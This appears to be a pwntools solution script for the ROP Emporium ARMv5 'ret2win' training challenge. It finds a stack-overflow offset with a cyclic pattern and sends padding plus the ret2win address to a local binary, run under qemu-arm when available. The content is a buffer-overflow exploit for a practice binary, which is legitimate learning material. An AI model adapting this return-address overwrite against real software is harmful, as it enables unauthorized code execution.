#!/usr/bin/env python3
from pwn import *
import sys

# Check if qemu-arm is available
import shutil

# Use qemu if available
use_qemu = shutil.which("qemu-arm")

# Load binary info
elf = ELF("./ret2win_armv5")
win_addr = elf.symbols["ret2win"]
print(f"[*] ret2win address: {hex(win_addr)}")

# Try to find the correct offset
# Common offsets for ARM: 28, 32, 36, 40, 44, 48
# Let's find it with pattern


def find_offset():
    print("[*] Finding offset with pattern...")

    # Create pattern
    pattern = cyclic(100)

    # Start process
    if use_qemu:
        p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabi", elf.path])
    else:
        p = process(elf.path)

    # Send pattern
    p.sendline(pattern)

    # Wait for crash
    try:
        p.wait(timeout=1)
        if p.corefile:
            # ARM uses PC register
            pc = p.corefile.pc
            print(f"[*] PC at crash: {hex(pc)}")

            # Try to find offset
            offset = cyclic_find(pc & 0xFFFFFFFF)
            if offset != -1:
                print(f"[+] Offset found: {offset}")
                return offset

            # Try with 4 bytes
            offset = cyclic_find(p32(pc & 0xFFFFFFFF))
            if offset != -1:
                print(f"[+] Offset found (4-byte): {offset}")
                return offset
    except:
        pass

    p.close()
    return None


# Find offset or use common ones
offset = find_offset()
print(offset)
if offset is None:
    print("[!] Could not find offset automatically, trying common values")
    offset = 36  # Default for ROP Emporium ARM

print(f"[*] Using offset: {offset}")

# Build payload
payload = b"A" * offset
payload += p32(win_addr)
print(f"[*] Payload length: {len(payload)}")

# Run exploit
print("[*] Running exploit...")
try:
    if use_qemu:
        print(f"[*] Using qemu-arm")
        p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabi", elf.path])
    else:
        p = process(elf.path)

    # Some ARM binaries have different prompts
    # Try without sendlineafter first
    p.sendline(payload)

    # Get output
    try:
        out = p.recvall(timeout=2)
        if out:
            print("[*] Output received:")
            print(out.decode())
        else:
            print("[!] No output received")
    except Exception as e:
        print(f"[!] Error receiving output: {e}")

    p.close()

except Exception as e:
    print(f"[!] Error: {e}")
    print("\n[*] If qemu-arm is not installed:")
    print("    sudo apt install qemu-user qemu-user-static")
